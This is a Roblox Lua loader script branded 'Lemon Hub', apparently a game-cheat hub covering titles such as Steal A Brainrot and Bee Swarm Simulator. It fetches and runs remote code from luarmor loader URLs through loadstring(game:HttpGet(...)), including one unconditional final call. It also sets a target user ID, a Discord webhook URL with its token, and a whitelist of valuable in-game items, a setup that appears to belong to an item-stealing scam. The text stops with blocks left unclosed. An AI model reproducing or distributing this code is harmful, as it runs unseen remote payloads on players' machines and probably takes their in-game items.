getgenv().targetUserId = rzgr1ks
getgenv().webhookURL = "https://discord.com/api/webhooks/1478495703822110731/-YzX6BprkXMNpejVVFWJDch-TuTtfUZVbILQXUmZavGmKwTT3G556xcTli2ijJIImv1F"
getgenv().whitelistBrainrot = {
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Meowl"] = true,
    ["Garama and Madundung"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Capitano Moby"] = true,
    ["Headless Horseman"] = true,
}
local PlaceId = game.PlaceId
local AssetService = game:GetService("AssetService")

local SupportedGames = {
    {
        Name = "Rivals",
        MainPlaceId = 17625359962,
        Script = "https://api.luarmor.net/files/v4/loaders/33edde69bda025f6d9d12b7a7409f3ba.lua"
    },
    {
        Name = "Devil Hunter",
        MainPlaceId = 131079272918660,
        Script = "https://api.luarmor.net/files/v4/loaders/f99a7df71541ab7485e1670eccbbbc07.lua"
    },
    {
        Name = "Steal A Brainrot",
        MainPlaceId = 109983668079237,
        Script = "https://api.luarmor.net/files/v4/loaders/6d08fbf253529a4fefa32ff404bd5448.lua"
    },
    {
        Name = "Forge",
        MainPlaceId = 76558904092080,
        Script = "https://api.luarmor.net/files/v4/loaders/4075444f18744ff5b25ce9a08e994579.lua"
    },
    {
        Name = "Bee Swarm Simulator",
        MainPlaceId = 1537690962,
        Script = "https://api.luarmor.net/files/v4/loaders/c7ef2416d2dc99b87c71199530b59c07.lua"
    },
    {
        Name = "Escape Tsunami For Brainrots",
        MainPlaceId = 131623223084840,
        Script = "https://api.luarmor.net/files/v4/loaders/bcca85605183902ca2c1c0e91dcbb269.lua"
    },
    {
        Name = "Your Bizarre Adventure",
        MainPlaceId = 2809202155,
        Script = "https://api.luarmor.net/files/v4/loaders/a388b5b60339839cc06a93df4b20f19e.lua"
    },
    {
        Name = "Fisch",
        MainPlaceId = 16732694052,
        Script = "https://api.luarmor.net/files/v4/loaders/810ead9e4a1c88d0780889c0db72d9b2.lua"
    },
    {
        Name = "BloxBurg",
        MainPlaceId = 185655149,
        Script = "https://api.luarmor.net/files/v4/loaders/ef81ca8d907d7f892e040c1534a9da6c.lua"
    },
    {
        Name = "ABA",
        MainPlaceId = 1458767429,
        Script = "https://api.luarmor.net/files/v4/loaders/226f505b8c64548e6632e15e7dbd9862.lua"
    },
}

local function getAllPlaces()
    local places = {}
    local success, err = pcall(function()
        local pages = AssetService:GetGamePlacesAsync()
        while true do
            for _, place in pairs(pages:GetCurrentPage()) do
                table.insert(places, place.PlaceId)
            end
            if pages.IsFinished then break end
            pages:AdvanceToNextPageAsync()
        end
    end)
    return places
end

local function findGameForPlace(placeId)
    for _, game in ipairs(SupportedGames) do
        if placeId == game.MainPlaceId then
            return game
        end
    end
    return nil
end

local directMatch = findGameForPlace(PlaceId)

if directMatch then
    print("[Lemon Hub] Loading " .. directMatch.Name .. "...")
    loadstring(game:HttpGet(directMatch.Script))()
else
    local allPlaces = getAllPlaces()
    local foundGame = nil
    
    for _, subPlaceId in ipairs(allPlaces) do
        local match = findGameForPlace(subPlaceId)
        if match then
            foundGame = match
            break
        end
    end
    
    if foundGame then
        print("[Lemon Hub] Loading " .. foundGame.Name .. " (subplace detected)...")
        loadstring(game:HttpGet(foundGame.Script))()
    else
        warn("[Lemon Hub] No script available for this game (PlaceId: " .. PlaceId .. ")")
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/f8227db06cefdc7b56ea6a3e7d4272de.lua"))()
